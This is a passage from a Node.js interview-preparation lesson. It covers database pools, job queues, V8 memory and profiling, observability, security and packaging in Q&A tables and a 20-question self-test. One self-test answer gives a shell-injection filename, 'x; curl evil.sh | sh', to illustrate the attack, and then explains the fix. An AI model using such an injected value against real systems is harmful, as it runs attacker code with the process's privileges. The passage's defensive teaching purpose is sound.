| 129 | How do you size a connection pool? | Sum every process: **replicas × pool `max` + workers' pools ≤ `max_connections` − headroom**. Postgres throughput is bounded by cores and disk, so bigger pools are often slower. Little's law gives the floor: queries/s × query time. [L25] |
| 130 | The app hangs and the DB is idle. What's happening? | Pool exhaustion: clients leaked on an error path, or held across slow awaits, and **`connectionTimeoutMillis: 0` waits forever**. The tell is the pool's waiting count. Set the timeout; fix the leak with `try/finally`. [L25] |
| 131 | What does `client.release(err)` do? | Destroys a broken client instead of returning it to the pool, so the next request doesn't inherit a dead or mid-transaction connection. [L25] |
| 132 | How do you pass a transaction through layers without parameters? | `AsyncLocalStorage`: `als.run({ client, merchantId }, fn)` per request or transaction, and repositories read `als.getStore()`. Context follows the async chain the way MDC follows a thread. [L25, L29] |
| 133 | `SET` vs `SET LOCAL` with a pool? | `SET app.merchant_id` lasts for the **session**, so the next request on that pooled connection inherits another tenant's ID: an RLS bypass. `SET LOCAL` ends with the transaction. The same rule makes PgBouncer's transaction mode safe. [L25] |
| 134 | Why does `pg` return `numeric` as a string? | It's arbitrary precision and a double would round it silently. Convert deliberately (a decimal library, or integer minor units), never with `parseFloat` on money. [L25] |
| 135 | ORM or query builder? | An ORM (Prisma) for productivity, a query builder (Kysely, Drizzle) for typed SQL you can still read, raw `pg` for control. **Whatever you pick, you must be able to see the SQL**, because N+1s and missing indexes live there. [L25] |
| 136 | How do Redis connections work from Node? | Redis is single-threaded and one connection **multiplexes pipelined commands**, so one shared client usually suffices. Blocking commands (`BLPOP`) and subscriber mode need dedicated connections. [L25] |
| 137 | What does `SKIP LOCKED` do? | `SELECT … FOR UPDATE SKIP LOCKED` skips rows other transactions have locked instead of waiting, so N workers **claim disjoint rows without contention**: the core of a Postgres queue. [L26] |
| 138 | Why do jobs run twice, and how do you make it safe? | At-least-once: the worker dies after the side effect but before the ack, or a slow job outlives its lease and is reclaimed. **Make handlers idempotent** (unique keys, state-guarded updates) and extend leases with heartbeats. [L26] |
| 139 | BullMQ vs a Postgres queue vs SQS? | Postgres: **enqueue in the same transaction** as the business write, no new infrastructure, fine at moderate volume. BullMQ: Redis, high throughput, rich scheduling, Redis's durability trade-offs. SQS: managed, scales, visibility timeouts, at-least-once. [L26] |
| 140 | How do you run a cron job once across N replicas? | Leader election with `pg_try_advisory_lock`: whoever gets the lock runs, the rest skip. Or move scheduling outside the app (a Kubernetes CronJob). [L26] |
| 141 | Which metric tells you a queue is unhealthy? | **The age of the oldest ready job.** Depth misleads: 10k jobs draining fast is fine, 50 stuck for an hour isn't. Add attempts, DLQ size, and per-tenant lag for fairness. [L26] |

---

## Part 7 — Production internals (20)

| # | Question | Strong answer |
|---|---|---|
| 142 | Explain V8's generational GC. | Most objects die young. **New space** (semi-spaces, the Scavenger) is collected often and cheaply; survivors are promoted to **old space**, collected by mark-sweep-compact with incremental and concurrent marking (Orinoco). Large objects get their own space. [L27] |
| 143 | `rss` vs `heapUsed` vs `external`? | `rss`: everything resident (heap, code, thread stacks, native allocations, Buffers). `heapTotal`/`heapUsed`: the V8 heap. `external`: memory owned by C++ objects tied to JS, Buffers included; `arrayBuffers` is the Buffer subset. **RSS > heap is normal.** [L27] |
| 144 | OOMKilled but no "heap out of memory" error. Why? | **The kernel killed it (exit 137) because RSS crossed the cgroup limit before V8 reached its heap limit**: off-heap memory (Buffers, native addons, threads), or `--max-old-space-size` set above the container limit. [L27] |
| 145 | How do you set `--max-old-space-size` in a container? | Explicitly, **about 75% of the container limit**, leaving room for off-heap memory; the default depends on the system. A runaway heap then fails as a clean V8 error instead of a SIGKILL. [L27, L33] |
| 146 | Name four leak patterns. | Unbounded Map caches, listeners never removed, intervals never cleared, closures capturing large objects, requests held in global arrays, never-settling promises holding their closures, retained Buffer slices. **Five beats four.** [L27] |
| 147 | What is a retaining path? | The chain of references from a GC root to an object: **why it's still alive**. In DevTools' Retainers view you read it until you reach your code's Map, listener or closure. [L27] |
| 148 | Can you take heap snapshots in production? | Carefully: a snapshot **pauses the process** and can need memory comparable to the heap again. Take it on an instance drained from traffic, or let `--heapsnapshot-near-heap-limit` capture one automatically. [L27] |
| 149 | `WeakRef` and `FinalizationRegistry`? | Weak references for caches that shouldn't keep objects alive. Finalization callbacks may run late or never, so **never use them to release resources**: close sockets and handles explicitly. [L27] |
| 150 | GC pauses and tail latency? | Major GCs on a large old space pause the thread, and pauses surface as p99 spikes. Correlate with `--trace-gc` or perf_hooks `'gc'` entries; allocate less, keep heaps modest, tune `--max-semi-space-size` for allocation-heavy services. [L27] |
| 151 | How do you find what's slow in a Node service? | Load-test (autocannon/k6) → CPU-profile **under load** (`--cpu-prof` or the inspector) → read the flame graph → fix the widest self-time at the right layer → re-measure. Profiling an idle process tells you nothing. [L28] |
| 152 | How do you read a flame graph? | Width is time on CPU, not chronology; height is stack depth. Look for **wide plateaus of self time**, not time spent in children. Netflix's 2014 "Node.js in Flames" found slowing Express route lookups exactly this way. [L28] |
| 153 | What is a hidden class? | V8's internal description of an object's shape (property names and layout). Same shape → inline caches hit and property access is a fixed offset. Different insertion orders, `delete` and type changes create new shapes. [L28] |
| 154 | What causes deoptimization? | Failed speculation: a value changes type, an object changes shape, a call site goes polymorphic → megamorphic. V8 throws away the optimized code and falls back a tier; `--trace-deopt` shows why. [L28] |
| 155 | Name V8's compilation tiers. | Ignition (interpreter) → Sparkplug (baseline) → Maglev (mid-tier optimizer) → TurboFan (optimizing). Hot code climbs; failed speculation drops it back. [L28] |
| 156 | Why are micro-benchmarks misleading? | Dead-code elimination, JIT warm-up, unrealistically monomorphic inputs, GC timing. **Benchmark the real path under realistic load**; use a harness (tinybench/mitata) for the rest and distrust results that look too good. [L28] |
| 157 | Why is pino faster than `console.log`? | JSON lines with minimal serialization to an asynchronous destination, transports in a worker thread. `console.log` formats with `util.inspect` and **can be synchronous** (files, and terminals on POSIX). [L29] |
| 158 | Which Node-specific metrics do you alert on? | **Event-loop delay p99, ELU, heap used vs limit, restarts and exit codes, pool waiting count, oldest job age**, plus GC pause time. CPU% alone hides a blocked loop. [L29] |
| 159 | Why must tracing load before your app code? | Auto-instrumentation **patches modules as they load**; import `pg` or `http` first and the patch misses them: no spans. Load it with `node --import ./instrumentation.ts`; ESM needs the loader hooks the OTel packages register. [L29] |
| 160 | What is `diagnostics_channel`? | Named pub/sub channels that core modules (`http`, `undici`, `net`, …) publish to and instrumentation subscribes to, at **near-zero cost when nobody listens**. Tracing without monkey-patching. [L29] |
| 161 | `AsyncLocalStorage` vs `ThreadLocal`? | ThreadLocal (and MDC) bind to a thread; in Node one thread serves every request, so **ALS binds to the async call chain** and follows `await`, timers and promises. In Node 24 it uses the AsyncContextFrame implementation by default. [L29] |

---

## Part 8 — Shipping safely (16)

| # | Question | Strong answer |
|---|---|---|
| 162 | What is prototype pollution? | A deep merge or query parser copies attacker keys like `__proto__` or `constructor.prototype` and **modifies `Object.prototype`**, so every object suddenly has `isAdmin: true`. Defences: schemas that strip unknown keys, `Map`/`Object.create(null)`, a merge that rejects those keys, `--disable-proto=delete`. [L30] |
| 163 | Is `vm` a sandbox? | **No: the docs say it isn't a security mechanism.** Code escapes through the prototype chain. Untrusted code belongs in a separate process or container with OS-level limits. [L30] |
| 164 | `npm ci` vs `npm install`? | `ci` requires a lockfile, deletes `node_modules`, installs exactly what the lock says, fails if it disagrees with `package.json`, and never writes it. `install` resolves ranges and may update the lock. **CI and Docker use `ci`.** [L30] |
| 165 | What is package provenance? | A signed attestation linking a published version to its source commit and CI build (`npm publish --provenance`). With **trusted publishing** (OIDC), CI publishes with no long-lived token to steal. [L30] |
| 166 | What does Node's permission model protect against? | `--permission` with `--allow-fs-read`, `--allow-fs-write`, `--allow-child-process` and friends limits **what your own process can do**, so a compromised dependency in the reconciler can't write outside its directory. Defence in depth, not a sandbox for untrusted code. [L30] |
| 167 | `Math.random()` for tokens? | Never: it's a fast PRNG whose state can be inferred from its outputs. `crypto.randomBytes` or `crypto.randomUUID()`. [L30] |
| 168 | How do you test code with timers? | Fake time: `node:test`'s mock timers or an injected clock, advanced explicitly. **Real sleeps make tests slow and flaky.** [L31] |
| 169 | Why does my test runner hang? | An open handle: a pool not ended, a server not closed, an interval not cleared. Same reason a script won't exit. Close everything in `after()` hooks. [L31] |
| 170 | `node:test` vs Vitest vs Jest? | `node:test`: built in, zero dependencies, runs `.ts` natively. Vitest: fast, ESM-native, great DX. Jest: mature, with ESM friction. For a Node service in 2026: `node:test` or Vitest. [L31] |
| 171 | What does the `exports` field do? | Declares the package's public entry points and **blocks deep imports** of anything unlisted (`ERR_PACKAGE_PATH_NOT_EXPORTED`). Conditions (`types`, `import`, `require`, `default`) pick a file per consumer. [L32, L04] |
| 172 | Why must `types` come first in a conditions object? | Conditions match **in object order and the first match wins**. Put `import` before `types` and TypeScript can resolve the JavaScript file with no types. [L32] |
| 173 | ESM-only or dual in 2026? | ESM-only: `require(esm)` works on every supported line and you avoid the dual-package hazard. Dual only for consumers stuck on older runtimes, or a top-level-await graph that CJS callers must `require`. [L32] |
| 174 | What does `^0.2.3` match? | `>=0.2.3 <0.3.0`. **A caret on 0.x pins the minor**, because 0.x minors are allowed to break. [L32] |
| 175 | What is a phantom dependency? | Importing a package you never declared that works only because npm hoisted it from someone else's tree. pnpm's strict `node_modules` breaks it, which is the point. [L32] |
| 176 | What does `NODE_ENV=production` change? | **Whatever libraries choose to do with it**: Express caches views and hides stack traces, `npm install` skips devDependencies. It doesn't make Node faster and isn't a substitute for real config. [L33] |
| 177 | What breaks when you move a Node service to Lambda? | Module scope is reused across invocations; freeze/thaw kills timers and sockets mid-flight; a pool per instance becomes a connection storm (hence RDS Proxy); cold starts reward bundling. [L33] |

---

## Part 9 — Judgement (10)

These have no single right answer. They test whether you think in trade-offs.

| # | Question | What a strong answer contains |
|---|---|---|
| 178 | When is Node the wrong choice for a service? | When the core work is CPU-bound and on the request path, or needs shared-memory parallelism. *"I'd keep Node at the I/O edge and put the CPU work behind a queue, on a worker pool or another runtime."* **Saying where your tool loses is a strong signal.** [L01, L21] |
| 179 | Express or Fastify for a new service? | Mechanism first: Fastify's router, validation and compiled serialization matter at high RPS with small handlers; behind a database the framework is a rounding error. Fastify for a new high-throughput JSON API, Express where the team and middleware already are, and **the trigger that would change it** (serialization showing in profiles). [L19] |
| 180 | Cluster or replicas? | Replicas by default: one process per container, the orchestrator supervises, signals and memory limits are per process. Cluster only on a VM with no orchestrator. *"Cluster inside Kubernetes duplicates the orchestrator and hides processes from it."* [L23] |
| 181 | Worker threads or a separate service? | Workers when the CPU work belongs to this service's latency story and its inputs are already in memory. A separate deployment when it needs independent scaling, another runtime, or failure isolation. Ledger's reconciler is a worker pool in its own deployment for both reasons. [L21, L34] |
| 182 | Postgres queue or a broker? | Postgres when enqueue must be transactional with the business write and volume is moderate. A broker when sustained throughput or fan-out outgrows the table's churn, or many consumers need the same stream. **The trigger is oldest-job age and vacuum pressure, not fashion.** [L26] |
| 183 | A colleague posts a micro-benchmark: library X is 5× faster. | Ask what it measured (warm JIT? dead-code elimination? realistic payloads?), then check whether that path even shows in your flame graph. *"If it's 2% of our profile, 5× faster saves 1.6%."* [L28] |
| 184 | 15 minutes to review a Node PR. What first? | **Unbounded things**: concurrency over input, buffering whole bodies or result sets, retries without budgets. Then missing timeouts and signals, floating promises, sync work in hot paths, catch-and-continue on programmer errors, resources not released on every path. Style last. [L09, L10, L13] |
| 185 | Run `.ts` natively in production or build? | Native for apps: one artefact, no build drift, erasable-only syntax keeps it honest. Build for libraries (Node won't strip under `node_modules`) and where bundling pays, like Lambda cold starts. *"I'd revisit if startup time or tooling constraints bite."* [L33] |
| 186 | The team wants a dependency for a 20-line utility. | Every dependency is code that can run at install time and can be hijacked. Twenty lines: write and test them. A parser, protocol or crypto implementation: take the well-maintained dependency. **Weigh maintenance and supply-chain risk, not just effort.** [L30] |
| 187 | What does Node not fix? | A bad data model, missing idempotency, unbounded work, absent timeouts, no observability. Node makes waiting cheap; it doesn't make your system correct. **Ending an architecture answer here is memorable.** [L34] |

---

## The 20-question self-test (do this cold, timed)

From [the README](../README.md). Two minutes each, out loud, no notes. Then compare with the model answers.

**1. Is Node single-threaded?**
Your JavaScript runs on one thread per isolate, so callbacks never run in parallel with each other. Around it, libuv's pool (4 threads by default) does file I/O, DNS lookups, crypto and zlib, V8 runs GC and compilation on its own threads, and network I/O happens in the kernel via epoll/kqueue/IOCP. **One JavaScript thread, several runtime threads, parallel I/O.** [L01, L07]

**2. The event-loop phases in order, and where `nextTick` and promises run.**
Timers → pending callbacks → idle/prepare → poll → check → close callbacks. Neither queue is a phase: after every single callback Node drains the nextTick queue, then the microtask queue, repeating until both are empty. The one exception worth volunteering: at the top level of an ES module, microtasks queued by the module body drain before the nextTick queue. [L05, L37]

**3. `setTimeout(fn, 0)` vs `setImmediate(fn)`, in the main module and inside an `fs` callback.**
In the main module the order is nondeterministic: 0 becomes 1 ms, and whether 1 ms has elapsed when the loop first enters the timers phase depends on startup timing. Inside an `fs` callback `setImmediate` always wins, because that callback runs in poll, check comes next, and timers only on the following iteration. [L05]

**4. Which APIs use the libuv pool, and what goes wrong when it saturates?**
`fs`, `dns.lookup` (and so `http.get`/`net.connect` with hostnames), async crypto and async zlib. With four threads, slow work in one category queues all the others: slow DNS makes file reads slow, password hashing under load delays compression. Reduce pool work (connection reuse, DNS caching), size `UV_THREADPOOL_SIZE` at launch, and measure. [L07]

**5. p99 tripled, CPU at 30%. Prove the loop is blocked and find the cause.**
A blocked loop is one busy core, which reads as low aggregate CPU. Prove it with `monitorEventLoopDelay` p99 and ELU near 1 (if ELU is low, suspect pool queueing or a downstream instead). Take a CPU profile under load and read the widest plateau, typically a big `JSON.stringify`, a `*Sync` call or a backtracking regex, then fix it at the right layer: cap, stream, partition or offload. [L08, L28]

**6. What is backpressure, and what happens when you ignore `write()` returning `false`?**
It's the consumer's signal to the producer: `write()` returns `false` when the buffer reaches `highWaterMark`, and the producer should wait for `'drain'`. Ignore it and nothing errors: chunks keep queuing in memory, RSS climbs, latency grows, and eventually the pod is OOMKilled. [L13]

**7. Why `pipeline()` instead of `.pipe()`?**
`.pipe()` moves data with backpressure but ignores errors: when one stream fails the others aren't destroyed, so descriptors, sockets and pooled DB clients leak and the request can hang forever. `pipeline()` destroys every stream on error, gives you one promise carrying the error, and accepts an `AbortSignal` for cancellation. [L13]

**8. What does Node do with an unhandled rejection, and why is that right?**
In the default `throw` mode it's treated as an uncaught exception: exit code 1, unless an `'unhandledRejection'` handler exists. It's right because a rejection nobody handles is a lost error on an operation that may have half-completed; crashing makes the bug visible and lets the supervisor start a clean process. [L06, L09]

**9. Operational vs programmer errors, and why exit after `uncaughtException`?**
Operational errors are expected failures of correct code (timeouts, `ECONNREFUSED`, `ENOENT`, bad input): handle them with retries, status codes and fallbacks. Programmer errors are bugs: crash. After an uncaught exception the stack unwound through code that may have half-applied an invariant, so the state is unknown; log, flush, exit non-zero, restart. [L09]

**10. CommonJS vs ESM: three differences. Can `require()` load ESM today?**
Synchronous `require` vs ESM's parse → link → evaluate (which enables top-level `await`); copied values vs live bindings; loose resolution with `__dirname` and `require.cache` vs full specifiers and format decided by extension, `"type"` or syntax detection. Yes: `require(esm)` is unflagged since 22.12 and 20.19, and throws `ERR_REQUIRE_ASYNC_MODULE` if the graph uses top-level `await`. [L04]

**11. `worker_threads` vs `child_process` vs `cluster` vs more replicas.**
Worker threads for CPU-bound JavaScript inside a service, pooled. Child processes to run other programs (pg_dump, ffmpeg) with args arrays and no shell. Cluster to share a port across processes on a VM with no orchestrator. Replicas, one process per container, as the default way to scale an API. [L21, L22, L23]

**12. Graceful shutdown in Kubernetes, step by step, including PID 1.**
The pod is marked terminating and endpoint removal propagates asynchronously while SIGTERM arrives. So: fail readiness, keep serving a few seconds (or a preStop sleep), `server.close()` and close idle keep-alive sockets, let in-flight requests finish under a deadline, stop claiming jobs, send SSE clients `retry:` and close, close DB and Redis pools, flush logs, exit, with an unref'd timer forcing exit before the 30 s grace period ends in SIGKILL. PID 1 gets no default signal actions, so Node without a handler ignores SIGTERM, and `npm start` as PID 1 doesn't forward signals reliably: exec-form `CMD ["node", "main.ts"]`, a handler, and `--init`/tini. [L24]

**13. Intermittent 502s from the load balancer, only on idle connections.**
The ALB's idle timeout (60 s by default) is longer than Node's `keepAliveTimeout` (5 s), so Node closes an idle connection just as the ALB sends a request on it; the ALB returns 502 and your app never logs anything. Set `keepAliveTimeout` above the LB's idle timeout (e.g. 65 s) and `headersTimeout` above `keepAliveTimeout`. [L17]

**14. Memory grows 50 MB an hour. How do you find the leak?**
First split heap from off-heap: is it `heapUsed` trending, or `rss`/`external`? For the heap, take three snapshots (baseline, after load, after more load), look at objects allocated between the first two that survive into the third, and follow their retaining paths to your Map, listener or closure. Fix it, then prove the slope is flat under the same load. [L27]

**15. OOMKilled (exit 137) with no "heap out of memory" error. Why?**
The kernel killed the process because RSS crossed the cgroup limit; V8 never reached its own heap limit. The memory was off-heap (Buffers, native addons, threads), or `--max-old-space-size` was set above the container limit. Set the heap to ~75% of the limit and watch `rss` vs `heapUsed` vs `external`. [L27]

**16. Why does `pool.query("BEGIN")` … `pool.query("COMMIT")` corrupt your transactions?**
Each `pool.query` can run on a different pooled client, so `BEGIN`, the statements and `COMMIT` land on different connections: the statements autocommit outside any transaction, and a connection can be left idle in a transaction for the next request. Use one client: `pool.connect()`, `BEGIN`, work, `COMMIT` or `ROLLBACK`, `release()` in `finally` (`release(err)` if it broke). [L25]

**17. How does `AsyncLocalStorage` work, and where does context get lost?**
`run(store, fn)` binds a store to the current async context; Node propagates it into every promise, timer and callback created inside (via AsyncContextFrame in Node 24), and `getStore()` reads it anywhere down that chain. It's lost when a callback runs from a context created elsewhere: callback libraries with their own queues, pools that invoke callbacks from another request's context, emitters created outside the request. Fix with `AsyncResource.bind`, `AsyncLocalStorage.bind` or `snapshot()`. [L29]

**18. Stream 4M rows as CSV in constant memory, and stop the query on disconnect.**
A pg cursor stream → a CSV Transform → gzip → `res`, inside `pipeline()` with a signal that aborts when `res` emits `'close'` before `writableFinished`. A slow client's backpressure pauses the cursor; a disconnect destroys every stream, closes the cursor, releases the client and stops the query, so memory stays flat throughout. [L13, L25]

**19. A dependency was compromised on npm overnight. What protected you, and what would have?**
What protects you: a lockfile with `npm ci` (no silent upgrade), install scripts disabled (`--ignore-scripts` or pnpm 10's allowlist), a release-age delay before adopting new versions, few dependencies, provenance checks, CI secrets not exposed to the install step. Then the response: find affected versions in every lockfile, rotate anything the install could read, rebuild from a clean lock; at runtime the permission model limits what a malicious package can reach. [L30]

**20. ``exec(`convert ${file}`)`` with user input: the attack and the fix.**
Shell injection: a filename like `x; curl evil.sh | sh` runs as a command with your process's privileges. Fix: `execFile`/`spawn` with an args array and no shell, an allowlist for the value, and `--` before user arguments; on Windows never pass user input to a `.bat`/`.cmd` (BatBadBut). [L22]

**Scoring:** 18–20 confident → ready. 14–17 → drill the gaps in `RECALL.md`. Under 14 → re-read the referenced lessons; you're recognising, not recalling.

---

## What's next

Rapid-fire tests recall. The live coding round tests production: *"what does this print?"* with nested ticks and promises, and *"implement `p-limit` / `EventEmitter` / `retry` on this shared screen."* Next: sixteen output puzzles verified on Node 24 and ten build-from-scratch challenges with reference solutions.

Next → **[Lesson 37: Output prediction & build-from-scratch challenges](37-output-and-implementation-challenges.md)**
